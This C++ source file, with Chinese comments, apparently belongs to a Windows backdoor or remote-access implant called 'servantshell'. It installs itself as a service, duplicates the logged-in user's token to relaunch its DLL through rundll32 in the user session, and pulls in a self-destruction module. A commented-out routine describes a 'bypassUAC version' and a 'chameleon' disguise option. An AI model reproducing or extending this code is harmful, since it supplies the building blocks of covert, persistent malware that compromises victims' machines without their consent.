// servantshell.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <process.h>
#include <Winsock2.h>
#include <ObjBase.h>
#include "destruction/SelfDestruction.h"
#include "../../common/BinNames.h"
#include "shell.h"
#include "tstring.h"
#include "common.h"
#include "Exports.h"
#include "SvtShell.h"
#include <Userenv.h>
#include <Wtsapi32.h>

#pragma comment(lib,"Ole32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib,"Wtsapi32.lib")
#pragma comment(lib,"Userenv.lib")

static DWORD					dwCurrState = SERVICE_STOPPED;
static SERVICE_STATUS_HANDLE	hSrv = NULL;
static BOOL						g_bService = TRUE;
//static ProcessDetector			g_detector;
extern HMODULE					g_hServantshell = NULL;

static BOOL SetStatus( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	srvStatus.dwCurrentState = dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 3000;

	return SetServiceStatus( hSrv, &srvStatus );
}

void CreateUserProcess()
{
	// 为了显示更加复杂的用户界面，我们需要从Session 0创建
	// 一个进程，但是这个进程是运行在用户环境下。
	// 我们可以使用CreateProcessAsUser实现这一功能。

	BOOL bSuccess = FALSE;
	STARTUPINFO si = {0};
	// 进程信息
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof(si);

	// 获得当前Session ID
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();

	HANDLE hToken = NULL;
	// 获得当前Session的用户令牌
	if (WTSQueryUserToken(dwSessionID, &hToken) == FALSE)
	{
		int nError = GetLastError();
		goto Cleanup;
	}

	// 复制令牌
	HANDLE hDuplicatedToken = NULL;
	if (DuplicateTokenEx(hToken,
		MAXIMUM_ALLOWED, NULL,
		SecurityIdentification, TokenPrimary,
		&hDuplicatedToken) == FALSE)
	{
		goto Cleanup;
	}

	// 创建用户Session环境
	LPVOID lpEnvironment = NULL;
	if (CreateEnvironmentBlock(&lpEnvironment,
		hDuplicatedToken, FALSE) == FALSE)
	{
		goto Cleanup;
	}

	// 获得复杂界面的名字，也就是获得可执行文件的路径
	TCHAR lpszClientPath[MAX_PATH*2];
	TCHAR lpszModulePath[MAX_PATH];
	TCHAR lpszSysPath[MAX_PATH];

	GetModuleFileName(GetModuleHandle(SERVANT_SHELL_BINNAME),lpszModulePath,MAX_PATH);
	GetSystemDirectory(lpszSysPath,MAX_PATH);
	wsprintf(lpszClientPath,_T("%s\\rundll32.exe \"%s\" Init"),lpszSysPath,lpszModulePath);

	debugLog(lpszClientPath);

	// 在复制的用户Session下执行应用程序，创建进程。
	// 通过这个进程，就可以显示各种复杂的用户界面了
	if (CreateProcessAsUser(hDuplicatedToken, 
		NULL, lpszClientPath, NULL, NULL, FALSE,                    
		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
		lpEnvironment, NULL, &si, &pi) == FALSE)
	{
		goto Cleanup;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	bSuccess = TRUE;

	// 清理工作

Cleanup:
	if (hToken != NULL)
		CloseHandle(hToken);
	if (hDuplicatedToken != NULL)
		CloseHandle(hDuplicatedToken);
	if (lpEnvironment != NULL)
		DestroyEnvironmentBlock(lpEnvironment);

}

void DeinitServantShell()
{
	debugLog(_T("deinit servantshell"));

	Shell::GetInstanceRef().Deinit();

//	g_detector.Stop();
}

void WINAPI ServiceHandler( DWORD dwCommand )
{
	if (! g_bService) return;

	switch( dwCommand )
	{
	case SERVICE_CONTROL_STOP:
		SetStatus( SERVICE_STOP_PENDING, 0, 1 );
		DeinitServantShell();
		SetStatus( SERVICE_STOPPED, 0, 0 );
		break;
		// 	case SERVICE_CONTROL_PAUSE:
		// 		SetStatus( SERVICE_PAUSE_PENDING, 0, 1 );
		// 		SetStatus( SERVICE_PAUSED, 0, 0 );
		// 		break;
		// 	case SERVICE_CONTROL_CONTINUE:
		// 		SetStatus( SERVICE_CONTINUE_PENDING, 0, 1 );
		// 		SetStatus( SERVICE_RUNNING, 0, 0 );
		// 		break;
		// 	case SERVICE_CONTROL_INTERROGATE:
		// 		SetStatus( dwCurrState, 0, 0 );
		// 		break;
	case SERVICE_CONTROL_SHUTDOWN:
		SetStatus( SERVICE_STOPPED, 0, 0 );
		break;
	}
}
void func1(void* p){ Init(FALSE); };

void WINAPI Main( 
	__in  DWORD dwArgc,
	__in  LPTSTR* lpszArgv
	)
{
	tstring svcname = lpszArgv[0];
	if (svcname == _T("dll")) g_bService = FALSE;
	if (g_bService) hSrv = RegisterServiceCtrlHandler(svcname.c_str(), (LPHANDLER_FUNCTION)ServiceHandler );

	SetStatus( SERVICE_START_PENDING, 0, 1 );

	_beginthread(func1,0,NULL);

	SetStatus( SERVICE_RUNNING, 0, 0 );
}

// static void CheckBypassUAC(HMODULE hModule)
// {
// 	TCHAR filepath[MAX_PATH] = {0};
// 	GetModuleFileName(NULL, filepath, MAX_PATH);
// 	debugLog(_T("CheckBypassUAC filepath : [%s]"), filepath);
// 
// 	//检查当前exe名称是否rundll32.exe，如果不是，则说明不是bypassUAC版本，则直接返回
// 	tstring filename = filepath;
// 	tstring::size_type pos = filename.find_last_of('\\');
// 	if (pos != tstring::npos) filename = filename.substr(pos + 1);
// 	makeLower(filename);
// 	if (filename != _T("rundll32.exe"))
// 	{
// 		return;
// 	}
// 
// 	//是bypassUAC版本，调用安装程序
// 	debugLog(_T("Install ServantShell service"));
// 	g_ServiceInfo.bUseChameleon = FALSE;
// 	InstallService();
// 	debugLog(_T("exit..."));
// 	ExitProcess(0);
// }

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hServantshell = hModule;
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
 		if (! g_bService) ServiceHandler(SERVICE_CONTROL_STOP);
 		break;
	}

	return TRUE;
}

SHELL_API void Exit()
{
	ServiceHandler(SERVICE_CONTROL_STOP);

	Sleep(200);

	ExitProcess(0);
}
